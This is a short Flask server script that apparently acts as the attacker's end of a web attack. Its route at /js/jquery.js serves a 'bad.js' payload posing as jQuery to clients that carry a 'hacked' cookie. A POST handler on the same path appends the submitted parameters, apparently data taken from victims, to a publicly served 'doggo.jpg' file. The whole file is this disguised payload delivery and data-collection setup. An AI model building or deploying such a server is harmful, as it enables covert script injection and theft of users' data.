from flask import Flask, request, render_template, send_from_directory
import json

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/js/jquery.js', methods = ['GET'])
def servejs():
    if (request.cookies.get('hacked')):
        return send_from_directory('static', 'bad.js') 
    else:
        return send_from_directory('static', 'good.js')

@app.route('/js/jquery.js', methods = ['POST'])
def jspost():
    print(request.args)
    message = json.dumps(request.args.to_dict())
    with open("./static/doggo.jpg", "ab") as f:
        f.write(message.encode('utf8'))
    return('ok thanks')

@app.route('/doggo.jpg')
def doggo():
    return send_from_directory('static', 'doggo.jpg')
